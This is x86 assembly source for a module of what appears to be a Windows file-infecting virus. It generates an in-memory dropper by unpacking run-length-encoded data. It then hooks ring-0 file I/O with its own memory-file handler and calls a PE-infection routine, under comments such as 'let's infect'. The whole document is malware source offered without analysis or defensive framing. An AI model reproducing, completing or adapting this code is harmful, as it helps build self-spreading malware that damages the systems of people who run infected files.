
ifndef PASS2
include globals.1
else
include globals.2
endif

DP_DOC = 1

indep_mod        segment public byte USE32 'CODE'

                 dd   'IMOD'  ; independent module signature


gendrop:
         cmp     initialize, 0
         je      cont

         mov     memfile_ptr, 0

         ret
cont:

;  eax = dropper type (DP_DOC)
;
;
         cmp  eax, 1
         jne  short GD@@failed

         pushad

         ; allocate memory block for dropper
         mov  eax,  MAXBODYLEN+4096
         mov  memfile_maxlen, eax      ; set maximal length
         mod_call md_alloc
         mov  memfile_ptr, eax         ; store ptr to buffer

         push Ring0_FileIO             ; install own file IO
         mov  Ring0_FileIO, offset cs:MemFileIO

         ; unpack dropper

         lea  esi, dropdata       ; src
         mov  edi, memfile_ptr    ; dest
         xor  ecx, ecx

GD@@NEXT:
         lodsb                    ; get byte
         or   al, al
         jz   short GD@@ZERO      ; if zero, unpack XX zeros
         stosb                    ; if not zero - store
         jmp  short GD@@NEXT
GD@@ZERO:
         lodsb                    ; get count of packed zeros
         xchg cl, al
         jcxz GD@@DONE            ; al = 0 - terminator
         rep  stosb               ; store cl zeros
         xchg cl, cl
         jmp  GD@@NEXT
GD@@DONE:
         ; compute file size
         sub  edi, memfile_ptr
         mov  memfile_size, edi

         ; let's infect
         ;int 3
         xor  edx, edx
         mov  al, INF_NT_EXE
         mod_call md_infPE


         ; done virtual file
         pop  Ring0_FileIO
         popad

         ; update dropper ptr and len

         ; ok ...
         mov  eax, memfile_ptr
         mov  ecx, memfile_size
         ret


GD@@failed:
         ; that's bad
         xor  eax, eax
         ret


; ======================================================================
include dropper.inc
; ======================================================================

memfile_size   dd 0
memfile_maxlen dd 0
memfile_ptr    dd 0

MemFileIO:
          cmp  eax, R0_OPENCREATFILE
          je   short MM@@OpenCreate
          cmp  eax, R0_GETFILESIZE
          je   short MM@@GetFileSize
          cmp  eax, R0_WRITEFILE
          je   short MM@@WriteFile
          cmp  eax, R0_READFILE
          je   short MM@@ReadFile
          ; err
          ret

MM@@OpenCreate:
          mov  eax, 1
          ret
MM@@GetFileSize:
          mov  eax, memfile_size
          ret

MM@@WriteFile:
          ; check if small enough
          ;int 3
          push eax
          mov  eax, ecx
          add  eax, edx
          cmp  eax, memfile_maxlen
          jae  ex2
          pop  eax

          push edi esi ecx

          mov  edi, edx
          add  edi, memfile_ptr
          rep  movsb
          pop  ecx esi edi
          push edi
          mov  edi, edx
          add  edi, ecx
          cmp  edi, memfile_size
          jbe  nochg
          mov  memfile_size, edi

nochg:
          pop  edi
          ret

ex2:      pop  eax

failed2wr:
          xor  eax, eax
          ret

MM@@ReadFile:
          push edi esi ecx
          mov  edi, memfile_size
          sub  edi, edx
          sub  edi, ecx
          ja   itsok
          add  ecx, edi
itsok:
          or   ecx, ecx
          jz   @@fld

          mov  edi, edx
          add  edi, memfile_ptr
          xchg esi, edi

          rep  movsb
@@fld:
          pop  ecx esi edi
          ret

indep_mod ends
          end
